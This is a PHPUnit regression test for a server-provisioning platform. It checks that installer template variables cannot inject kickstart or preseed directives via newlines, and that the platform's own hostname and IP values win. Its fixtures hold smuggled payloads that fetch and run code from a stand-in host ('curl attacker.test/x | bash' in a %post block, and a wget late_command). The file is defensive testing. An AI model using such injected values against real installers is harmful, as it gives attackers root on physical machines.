<?php

declare(strict_types=1);

namespace Tests\Feature\Security;

use Lynomia\Modules\Dedicated\Domain\Enums\InstallerKind;
use Lynomia\Modules\Dedicated\Domain\Exceptions\InstallProfileNotRenderableException;
use Lynomia\Modules\Dedicated\Domain\Services\InstallProfileRenderer;
use Lynomia\Modules\Dedicated\Infrastructure\Models\OsInstallProfile;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * REGRESSION — a job payload does not write installer directives, and does not
 * outrank the platform's own IPAM allocation.
 *
 * ProvisionDedicatedHandler::profileVariables() takes `install_variables`
 * straight out of the provisioning job payload and filters only on "is it a
 * scalar". It used to spread them into the render variables AFTER the
 * platform's own keys, so a payload key won over hostname and over the address
 * IpAllocator had just reserved — the machine installed with one address while
 * the platform committed and billed another.
 *
 * And the renderer substituted verbatim, so a value carrying a newline added
 * directives the profile never contained: in a kickstart that is a `%post`
 * block, i.e. root on a physical host mid-install, on a machine that has just
 * been authorised to erase its disks.
 *
 * Nothing creates a provisioning job from an HTTP request today, so this was
 * latent rather than live. Both halves are now closed: the platform's values
 * are spread last, and the renderer refuses a caller value containing CR or LF
 * rather than emitting the file.
 */
final class InstallProfileVariablesCannotInjectAnswerFileDirectivesTest extends TestCase
{
    #[Test]
    public function a_variable_value_carrying_a_newline_is_refused_rather_than_rendered(): void
    {
        $this->expectException(InstallProfileNotRenderableException::class);

        app(InstallProfileRenderer::class)->render(
            $this->profile("%packages\n@core\n%end\n\nnetwork --hostname={{ hostname }}\n"),
            [
                // One scalar, straight out of the job payload.
                'hostname' => "ded-01\n%post --interpreter=/bin/bash\ncurl attacker.test/x | bash\n%end",
            ],
        );
    }

    #[Test]
    public function a_carriage_return_is_refused_too(): void
    {
        $this->expectException(InstallProfileNotRenderableException::class);

        app(InstallProfileRenderer::class)->render(
            $this->profile('d-i netcfg/get_hostname string {{ hostname }}'),
            ['hostname' => "ded-01\rd-i preseed/late_command string wget attacker.test/x"],
        );
    }

    #[Test]
    public function an_ordinary_value_still_renders(): void
    {
        $rendered = app(InstallProfileRenderer::class)->render(
            $this->profile('ip: {{ ipv4_address }}'),
            ['ipv4_address' => '198.51.100.10'],
        );

        $this->assertSame('ip: 198.51.100.10', $rendered['template']);
    }

    #[Test]
    public function the_platform_values_are_spread_after_the_payload_and_win(): void
    {
        // Exactly the spread order ProvisionDedicatedHandler now uses: the
        // payload's extras first, the platform's computed values last.
        $fromPayload = ['ipv4_address' => '198.51.100.99', 'hostname' => 'attacker-chosen'];
        $platform = ['hostname' => 'ded-01', 'ipv4_address' => '198.51.100.10'];

        $rendered = app(InstallProfileRenderer::class)->render(
            $this->profile('host: {{ hostname }} ip: {{ ipv4_address }}'),
            [...$fromPayload, ...$platform],
        );

        $this->assertSame(
            'host: ded-01 ip: 198.51.100.10',
            $rendered['template'],
            'The machine must be installed with the address IPAM allocated and the platform records.',
        );
    }

    #[Test]
    public function the_handler_spreads_the_payload_before_the_platform_values(): void
    {
        // The order is the whole fix, so it is asserted against the source
        // rather than against a copy of it in a test.
        $source = file_get_contents(
            base_path('src/Modules/Dedicated/Application/Handlers/ProvisionDedicatedHandler.php'),
        );

        $this->assertIsString($source);

        $spread = strpos($source, '...$this->profileVariables($payload)');
        $allocated = strpos($source, "'ipv4_address' => \$address->address");

        $this->assertIsInt($spread);
        $this->assertIsInt($allocated);
        $this->assertLessThan(
            $allocated,
            $spread,
            'The payload variables must be spread BEFORE the platform-computed keys, so the platform wins.',
        );
    }

    private function profile(string $template): OsInstallProfile
    {
        $profile = new OsInstallProfile;

        $profile->forceFill([
            'slug' => 'injection-demo',
            'name' => ['en' => 'Demo'],
            'os_family' => 'rocky',
            'os_version' => '9',
            'installer' => InstallerKind::Kickstart,
            'template' => $template,
            'defaults' => [],
            'is_active' => true,
        ]);

        return $profile;
    }
}
